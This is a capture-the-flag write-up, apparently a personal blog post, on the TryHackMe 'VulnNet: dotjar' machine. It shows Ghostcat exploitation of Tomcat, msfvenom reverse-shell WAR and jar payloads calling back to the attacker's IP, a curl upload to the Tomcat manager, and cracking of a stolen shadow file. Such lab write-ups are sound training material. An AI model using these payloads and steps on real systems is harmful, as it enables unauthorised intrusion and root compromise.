---
title: "TryHackMe | VulnNet: dotjar"
layout: post
date: 2023-11-22 19:00
tag: 
- TryHackMe
- Pentesting
- VulnNet
- Linux
- Java
- Ghostcat
- Apache Tomcat
- AJP
image: https://tryhackme-images.s3.amazonaws.com/room-icons/599fe941d59b03cfd775b9db850af119.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

VulnNet dotjar is a java focused machine that is vulnerable to Ghostcat, We used this vulnerability to find some credentials which we used to upload a malicious war file what gives us remote code execution on the webserver. The root part was about creating a java reverse shell which will be executed as root what gives us a root shell.

---

# Nmap

```bash
nmap -A -T4 10.10.203.123
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-24 12:01 +01
Nmap scan report for 10.10.203.123
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
```

In the nmap scan we see that we have only two open ports (8009 & 8080). The port 8080 has the Apache Tomcat service running, which is an implementation of the Java Servlet which provides a pure Java HTTP web server environment in which Java code can run. And the AJP protocol is running on port 8009 which is used by Tomcat to communicate with the servlet container that sits behind the webserver using TCP connections.

>_Java Servlet_ is a class that extends the capabilities of the servers and responds to the incoming requests.

Here on port 8080, I cannot access the Host Manager portal since I don't have any credentials yet :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124121228.png>)

So I went to see if this version of Tomcat is vulnerable, and yet it is vulnerable to ghostcat vulnerability.
An attacker could exploit this vulnerability to read web application files. In instances where the vulnerable server allows file uploads, an attacker could upload malicious JSP code and trigger this vulnerability to gain RCE.

[https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat](https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat)

The above exploit didn't work for me for some reason, so I used **Metasploit** to exploit this vulnerability :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124122116.png>)

I set the required fields and run the exploit, boom I got valid credentials :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124121942.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124122035.png>)

Now I can login and access the Host Manager portal :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124121906.png>)

I directly thought about uploading a malicious war file and gain a remote shell on the webserver :

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.1.117 LPORT=9999 -f war > shell.war
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124124134.png>)

Using curl, I can upload the generated malicious file using the --upload-file option :

```bash
curl -u 'webdev:<REDACTED>' http://10.10.203.123:8080/manager/text/deploy?path=/myrevshell --upload-file shell.war
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124124152.png>)

And with the bellow command I can see the uploaded revshell :

```bash
curl -u 'webdev:<REDACTED>' http://10.10.203.123:8080/manager/text/list
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124124343.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124124211.png>)

And I got a shell as **web** user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124124055.png>)

# web -> jdk-admin

While trying to escalate, I found a shadow backup file in the */var/backups* directory, so I downloaded it to my local machine :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124134601.png>)

The shadow file contains hashes of users, I couldn't crack root's hash, only the jdk-admin's hash was crackable : 

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124135021.png>)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124135111.png>)

And I am the jdk-admin now, I can read the user flag :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124135925.png>)

# PE

Checking the privileges of my current user I found that I can run the java command as root on any jar file :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124135956.png>)

So I directly thought about creating a jar reverse shell and upload it to the machine and then I will get a shell as root :

```bash
msfvenom -p java/shell_reverse_tcp LHOST=10.9.1.117 LPORT=4444 -f jar > exp.jar
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124134722.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124140203.png>)

And yes I am root!

![Alt text](<../../../assets/images/THMPics/Pasted image 20231124134739.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>